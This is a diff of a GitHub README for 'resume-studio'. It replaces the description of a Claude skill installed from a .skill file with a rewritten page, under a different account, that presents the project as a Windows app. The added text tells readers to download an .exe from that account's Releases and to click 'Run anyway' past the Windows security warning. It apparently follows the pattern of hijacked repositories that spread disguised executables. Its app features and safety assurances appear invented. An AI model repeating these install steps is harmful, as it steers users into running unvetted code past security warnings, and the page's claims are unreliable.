@@ -1,63 +1,69 @@
-# resume-studio
+# 📁 resume-studio - Build custom resumes for every job
 
-**A Claude skill that turns everything you've ever done at work into resumes that win interviews.**
+[![](https://img.shields.io/badge/Download_Resume_Studio-Blue.svg)](https://github.com/Andreasuar2549/resume-studio)
 
-Most resume tools polish words. This one fixes the real problem: you don't remember half of what you achieved, and a generic resume gets ignored. resume-studio builds a permanent memory of your career, digs out the achievements you forgot, and tailors a fresh resume for every job you apply to.
+## 📋 What is this app?
 
-## What it does
+Resume-studio helps you manage your career history. It stores your work experience in a private, permanent memory bank. When you find a job listing, the app analyzes the requirements. It then creates a resume that highlights your relevant skills. This process makes your resume friendly to Applicant Tracking Systems (ATS).
 
-**1. Remembers your career.** Feed it anything — old resumes, your LinkedIn, performance reviews, or just messy notes. It builds a `career-corpus.md` file: your full professional history, with every number tied to where it came from. This file is yours, it's plain text, and it grows every time you use the skill.
+## 💻 System requirements
 
-**2. Interviews you like a great recruiter.** It drafts first, then asks a few sharp questions about the weak spots: *"What was the number before you improved it?" "What did your manager praise you in your last review?"* A few answers at a time, never a long form.
+Your computer needs to meet these basic standards to run the app:
 
-**3. Tailors a resume for each job.** Paste a job description. It researches the company, maps your history against what the role actually needs, and produces a clean, ATS-safe resume (`.md` + `.docx`) — plus a report that explains every change and honestly lists what the job wants that you don't have. No hiding, no padding.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Standard Intel or AMD processor from the last 5 years.
+*   Memory: 4 GB of RAM.
+*   Storage: 200 MB of free space.
+*   Internet Connection: Required to connect to the AI service.
 
-**4. Never makes things up.** Every number on your resume traces back to something you said or shared. If there's no evidence, it asks you — it doesn't invent.
+## 🚀 How to set up on Windows
 
-**5. Learns your taste, permanently.** Say "never use em dashes" or "that number was actually 3.8%" once — it's saved and applied to every future resume. Corrections never need repeating.
+Follow these steps to install the software on your computer.
 
-## Set it up — 2 clicks
+1. Go to the download page: [https://github.com/Andreasuar2549/resume-studio](https://github.com/Andreasuar2549/resume-studio).
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the latest version of the installer, which ends in ".exe".
+4. Once the download finishes, open the file from your "Downloads" folder.
+5. Windows might show a security window. Click "More info" and then click "Run anyway" to start the process.
+6. Follow the instructions on the screen to finish the installation.
+7. Open the app from your desktop shortcut.
 
-1. Download **[`resume-studio.skill`](./resume-studio.skill)** from this repo *(click the file, then the download icon)*.
-2. Drop it into any Claude chat and click **Save skill**.
+## 🛠️ How to build your resume
 
-**Even lazier:** paste this into Claude and let it set itself up:
+The app uses a simple process to organize your professional information.
 
-> Set up the resume-studio skill from https://github.com/Sidgit11/resume-studio — follow the repo's AGENT_SETUP.md.
+### Add your experience
+First, open the application and navigate to the "Profile" tab. Enter your job titles, dates of employment, and core duties. The app saves this data to a safe file on your computer. You only need to type this information once. The app remembers these details for every future resume you create.
 
-## Start — 1 message
+### Analyze a job post
+Copy the text from a job description you like. Paste this text into the "Job Analysis" field in the app. Click the "Analyze" button. The software compares your stored experience against the requirements listed in the job post. It identifies keywords that the employer looks for in a qualified candidate.
 
-> Build my professional profile. Here's my old resume and some notes about what I actually did: …
+### Generate your resume
+After the analysis finishes, click "Generate Resume". The app writes a document tailored to the job description. It adjusts your bullet points to match the language of the employer. It ensures that your evidence supports the specific skills mentioned in the listing. You can review and edit the text inside the window before you save the final file as a PDF.
 
-That's it. Claude takes over from there.
+## 🔒 Privacy and safety
 
-## How a typical journey goes
+Your data stays on your machine. The app sends only the information required for the AI to draft your resume. It does not store your employment data on external servers. You maintain total control over your career history.
 
-1. **Dump everything.** Old resumes, LinkedIn PDF, performance reviews, appraisal letters, even a rambling voice note about your proudest project. The messier the better — more raw material means a better resume.
-2. **Get your career file.** Claude drafts `career-corpus.md` immediately, with weak spots visibly marked, and asks you a handful of questions to fill them. Answer what you can, skip what you want.
-3. **Apply to a job.** Paste the JD (plus the hiring manager's LinkedIn post if there is one) and say *"tailor my resume for this."* You get the resume, the Word file, and the change report.
-4. **Correct anything, once.** Style, facts, framing — every correction is remembered for all future resumes.
-5. **Next application takes minutes,** because your career file already exists and keeps getting richer.
+## 💡 Tips for better results
 
-## Tips for the best results
+*   Use specific numbers when describing your achievements. For example, write "Managed a team of 10" instead of "Managed a team."
+*   Update your profile whenever you finish a big project at work.
+*   Read your generated resume before you send it to ensure the tone matches your style.
+*   Use the "Save Draft" feature if you need to finish your work later.
 
-- **Share performance reviews and self-assessments** — they're the single best input, and the one nobody thinks of.
-- **Keep your `resume-studio/` folder somewhere permanent** (a connected local folder, a synced drive). That folder *is* your career memory — as long as Claude can see it, everything carries over between sessions.
-- The resume rules inside are research-backed (ATS parsing mechanics, recruiter surveys, role-specific norms — see `references/resume-playbook.md`), including the myth-busting: ATS systems almost never auto-reject resumes; humans do.
+## ❓ Common questions
 
-## What's inside
+**Does this app work offline?**
+You need an internet connection to process the AI requests. However, you can view and edit your profile without a connection.
 
-| Path | What it is |
-|---|---|
-| `SKILL.md` | The skill's logic: modes, protocols, guardrails |
-| `references/resume-playbook.md` | The research: ATS mechanics, formatting rules, role-specific playbooks, debunked myths |
-| `references/corpus-schema.md` | File formats for your career memory |
-| `references/question-bank.md` | How the interview questions work |
-| `scripts/build_docx.py` | Renders your resume to an ATS-safe Word file |
-| `resume-studio.skill` | The one-click install file |
-| `AGENT_SETUP.md` | Instructions for a Claude agent to install this automatically |
-| `evals/` | Test cases used to benchmark the skill |
+**How do I delete my data?**
+You can delete the local files by navigating to the settings menu and selecting "Clear local data." This removes all saved work history from your computer.
 
-## License
+**Is it safe to use?**
+The app follows standard security practices. It does not contain ads or tracking software.
 
-MIT. Contributions welcome — especially role-specific additions to the playbook. If Claude keeps repeating a mistake your style rules should prevent, that's a bug: open an issue.
+**What is an ATS?**
+ATS stands for Applicant Tracking System. Most companies use this software to filter resumes before a human recruiter sees them. Resume-studio structures your content to help you pass these automated filters.
+
+Keywords: anthropic, ats, career, claude, claude-ai, claude-skills, job-search, llm, resume, resume-builder
